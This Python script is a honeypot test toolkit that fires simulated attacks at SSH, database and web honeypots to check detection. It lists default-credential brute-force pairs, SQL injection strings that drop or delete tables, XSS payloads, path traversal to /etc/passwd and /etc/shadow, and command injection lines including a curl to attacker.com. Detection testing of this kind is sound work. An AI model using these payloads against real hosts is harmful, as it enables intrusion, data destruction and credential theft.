"""
ATTACK TEST TOOLKIT - Simulate Various Attacks Against Honeypots
Use this to test and validate honeypot detection capabilities
"""

import socket
import subprocess
import requests
import json
import time
import sys
from datetime import datetime

class AttackTester:
    """
    Test framework for simulating attacks against honeypots:
    1. SSH Brute force attacks
    2. SQL Injection attacks
    3. Web application attacks (XSS, Command Injection, etc.)
    4. Multi-vector attack campaigns
    """
    
    def __init__(self, ssh_host='localhost', ssh_port=2222, 
                 database_host='localhost', database_port=3307,
                 web_host='localhost', web_port=8080):
        self.ssh_host = ssh_host
        self.ssh_port = ssh_port
        self.database_host = database_host
        self.database_port = database_port
        self.web_host = web_host
        self.web_port = web_port
        
        self.results = []
    
    def log(self, message, level="INFO"):
        """Log test activity"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"[{timestamp}] [{level}] {message}")
    
    # ==================== SSH HONEYPOT ATTACKS ====================
    
    def test_ssh_single_login_attempt(self):
        """Test 1: Single SSH login attempt"""
        self.log("TEST 1: Single SSH Login Attempt")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.ssh_host, self.ssh_port))
            
            # Receive SSH banner
            banner = sock.recv(1024)
            self.log(f"  ✓ Received banner: {banner.decode('utf-8', errors='ignore').strip()}")
            
            # Send client banner
            sock.send(b"SSH-2.0-OpenSSH_8.0\r\n")
            
            # Send dummy auth attempt
            sock.send(b"root:password123")
            
            sock.close()
            self.log("  ✓ Test completed")
            self.results.append({"test": "SSH Single Login", "status": "EXECUTED"})
            
        except Exception as e:
            self.log(f"  ✗ Error: {str(e)}", "ERROR")
            self.results.append({"test": "SSH Single Login", "status": "FAILED", "error": str(e)})
    
    def test_ssh_bruteforce(self, attempts=10):
        """Test 2: SSH Brute force attack (multiple login attempts)"""
        self.log(f"TEST 2: SSH Brute Force Attack ({attempts} attempts)")
        
        credentials = [
            ("root", "root"),
            ("root", "123456"),
            ("root", "password"),
            ("admin", "admin"),
            ("admin", "password123"),
            ("root", "admin"),
            ("test", "test"),
            ("user", "password"),
            ("oracle", "oracle"),
            ("postgres", "postgres"),
        ]
        
        for i, (username, password) in enumerate(credentials[:attempts]):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.ssh_host, self.ssh_port))
                
                # Receive banner
                sock.recv(1024)
                
                # Send auth
                auth_payload = f"{username}:{password}".encode()
                sock.send(auth_payload)
                
                # Wait for response
                time.sleep(0.5)
                sock.close()
                
                self.log(f"  Attempt {i+1}: {username}/{password}")
                
            except Exception as e:
                self.log(f"  Attempt {i+1}: Failed - {str(e)}", "WARN")
        
        self.log("  ✓ Brute force test completed")
        self.results.append({"test": "SSH Brute Force", "attempts": attempts, "status": "EXECUTED"})
    
    # ==================== SQL HONEYPOT ATTACKS ====================
    
    def test_sql_connection_attempt(self):
        """Test 3: Basic SQL database connection"""
        self.log("TEST 3: SQL Database Connection Attempt")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.database_host, self.database_port))
            
            self.log(f"  ✓ Connected to database on {self.database_host}:{self.database_port}")
            
            # Receive MySQL greeting
            greeting = sock.recv(1024)
            self.log(f"  ✓ Received greeting packet")
            
            # Send auth request (root user)
            sock.send(b"root:password123")
            
            sock.close()
            self.log("  ✓ Test completed")
            self.results.append({"test": "SQL Connection", "status": "EXECUTED"})
            
        except Exception as e:
            self.log(f"  ✗ Error: {str(e)}", "ERROR")
    
    def test_sql_injection_attacks(self):
        """Test 4: Various SQL Injection attack patterns"""
        self.log("TEST 4: SQL Injection Attacks")
        
        injection_payloads = [
            "1' OR '1'='1",
            "1; DROP TABLE users; --",
            "1' UNION SELECT * FROM users --",
            "1' OR 1=1 --",
            "'; DELETE FROM users; --",
            "1' UNION SELECT username, password FROM users --",
        ]
        
        for i, payload in enumerate(injection_payloads):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(3)
                sock.connect((self.database_host, self.database_port))
                
                # Receive greeting
                sock.recv(1024)
                
                # Send SQL injection payload
                sock.send(payload.encode())
                
                self.log(f"  Payload {i+1}: {payload[:50]}")
                time.sleep(0.2)
                
                sock.close()
                
            except Exception as e:
                self.log(f"  Payload {i+1}: Connection failed", "WARN")
        
        self.log("  ✓ SQL Injection tests completed")
        self.results.append({"test": "SQL Injection", "payloads": len(injection_payloads), "status": "EXECUTED"})
    
    # ==================== WEB HONEYPOT ATTACKS ====================
    
    def test_web_basic_request(self):
        """Test 5: Basic HTTP request to web honeypot"""
        self.log("TEST 5: Basic HTTP Request")
        
        try:
            url = f"http://{self.web_host}:{self.web_port}/"
            response = requests.get(url, timeout=5)
            
            self.log(f"  ✓ Status Code: {response.status_code}")
            self.log(f"  ✓ Response Length: {len(response.text)} bytes")
            self.results.append({"test": "Web Basic Request", "status_code": response.status_code, "status": "EXECUTED"})
            
        except Exception as e:
            self.log(f"  ✗ Error: {str(e)}", "ERROR")
    
    def test_xss_attacks(self):
        """Test 6: XSS (Cross-Site Scripting) attacks"""
        self.log("TEST 6: XSS (Cross-Site Scripting) Attacks")
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'></iframe>",
        ]
        
        for i, payload in enumerate(xss_payloads):
            try:
                url = f"http://{self.web_host}:{self.web_port}/search?q={payload}"
                response = requests.get(url, timeout=3)
                
                self.log(f"  Payload {i+1}: {payload[:40]}... [{response.status_code}]")
                
            except Exception as e:
                self.log(f"  Payload {i+1}: Failed", "WARN")
        
        self.log("  ✓ XSS tests completed")
        self.results.append({"test": "XSS Attacks", "payloads": len(xss_payloads), "status": "EXECUTED"})
    
    def test_sql_injection_web(self):
        """Test 7: SQL Injection via web interface"""
        self.log("TEST 7: SQL Injection via Web")
        
        sql_payloads = [
            "1' OR '1'='1",
            "admin' --",
            "1; DROP TABLE users; --",
            "' UNION SELECT * FROM users --",
        ]
        
        for i, payload in enumerate(sql_payloads):
            try:
                url = f"http://{self.web_host}:{self.web_port}/api/users"
                data = {"id": payload, "username": "test"}
                response = requests.post(url, data=data, timeout=3)
                
                self.log(f"  Payload {i+1}: {payload[:40]}... [{response.status_code}]")
                
            except Exception as e:
                self.log(f"  Payload {i+1}: Failed", "WARN")
        
        self.log("  ✓ SQL Injection (Web) tests completed")
        self.results.append({"test": "Web SQL Injection", "payloads": len(sql_payloads), "status": "EXECUTED"})
    
    def test_command_injection(self):
        """Test 8: Command Injection attacks"""
        self.log("TEST 8: Command Injection Attacks")
        
        command_payloads = [
            "; ls -la",
            "; whoami",
            "&& cat /etc/passwd",
            "| curl http://attacker.com",
            "`id`",
            "$(whoami)",
        ]
        
        for i, payload in enumerate(command_payloads):
            try:
                url = f"http://{self.web_host}:{self.web_port}/execute"
                params = {"cmd": payload}
                response = requests.get(url, params=params, timeout=3)
                
                self.log(f"  Payload {i+1}: {payload[:40]}... [{response.status_code}]")
                
            except Exception as e:
                self.log(f"  Payload {i+1}: Failed", "WARN")
        
        self.log("  ✓ Command Injection tests completed")
        self.results.append({"test": "Command Injection", "payloads": len(command_payloads), "status": "EXECUTED"})
    
    def test_path_traversal(self):
        """Test 9: Path Traversal attacks"""
        self.log("TEST 9: Path Traversal Attacks")
        
        traversal_paths = [
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            "....//....//etc/shadow",
            "%2e%2e%2fetc%2fpasswd",
        ]
        
        for i, path in enumerate(traversal_paths):
            try:
                url = f"http://{self.web_host}:{self.web_port}/file?path={path}"
                response = requests.get(url, timeout=3)
                
                self.log(f"  Payload {i+1}: {path[:40]}... [{response.status_code}]")
                
            except Exception as e:
                self.log(f"  Payload {i+1}: Failed", "WARN")
        
        self.log("  ✓ Path Traversal tests completed")
        self.results.append({"test": "Path Traversal", "payloads": len(traversal_paths), "status": "EXECUTED"})
    
    # ==================== MULTI-VECTOR CAMPAIGNS ====================
    
    def test_coordinated_attack_campaign(self):
        """Test 10: Multi-vector attack campaign from same source"""
        self.log("TEST 10: Coordinated Multi-Vector Attack Campaign")
        
        # Simulate attacker trying multiple approaches
        self.log("  Phase 1: Reconnaissance via HTTP")
        try:
            requests.get(f"http://{self.web_host}:{self.web_port}/", timeout=2)
        except:
            pass
        time.sleep(1)
        
        self.log("  Phase 2: SQL Database probing")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.database_host, self.database_port))
            sock.send(b"admin:password")
            sock.close()
        except:
            pass
        time.sleep(1)
        
        self.log("  Phase 3: SSH brute force")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((self.ssh_host, self.ssh_port))
            sock.recv(1024)
            sock.send(b"root:root")
            sock.close()
        except:
            pass
        
        self.log("  ✓ Multi-vector campaign completed")
        self.results.append({"test": "Multi-Vector Campaign", "phases": 3, "status": "EXECUTED"})
    
    def run_all_tests(self):
        """Run all attack tests sequentially"""
        print("\n" + "="*70)
        print("HONEYPOT ATTACK TEST SUITE - Testing Detection Capabilities")
        print("="*70 + "\n")
        
        try:
            self.test_ssh_single_login_attempt()
            print()
            time.sleep(2)
            
            self.test_ssh_bruteforce(attempts=10)
            print()
            time.sleep(2)
            
            self.test_sql_connection_attempt()
            print()
            time.sleep(2)
            
            self.test_sql_injection_attacks()
            print()
            time.sleep(2)
            
            self.test_web_basic_request()
            print()
            time.sleep(2)
            
            self.test_xss_attacks()
            print()
            time.sleep(2)
            
            self.test_sql_injection_web()
            print()
            time.sleep(2)
            
            self.test_command_injection()
            print()
            time.sleep(2)
            
            self.test_path_traversal()
            print()
            time.sleep(2)
            
            self.test_coordinated_attack_campaign()
            print()
            
        except KeyboardInterrupt:
            self.log("\nTests interrupted by user", "WARN")
        
        self.print_summary()
    
    def print_summary(self):
        """Print test summary"""
        print("\n" + "="*70)
        print("TEST EXECUTION SUMMARY")
        print("="*70)
        
        successful = sum(1 for r in self.results if r.get("status") == "EXECUTED")
        failed = sum(1 for r in self.results if r.get("status") == "FAILED")
        
        print(f"\nTotal Tests: {len(self.results)}")
        print(f"Executed: {successful}")
        print(f"Failed: {failed}")
        
        print("\nDetailed Results:")
        for result in self.results:
            status_icon = "✓" if result.get("status") == "EXECUTED" else "✗"
            print(f"  {status_icon} {result.get('test')}")
        
        print("\n" + "="*70)
        print("Check honeypot_logs/*.json files for captured attack details")
        print("="*70 + "\n")

if __name__ == "__main__":
    
    # Get target hosts from command line or use defaults
    ssh_host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    
    tester = AttackTester(
        ssh_host=ssh_host,
        database_host=ssh_host,
        web_host=ssh_host
    )
    
    tester.run_all_tests()
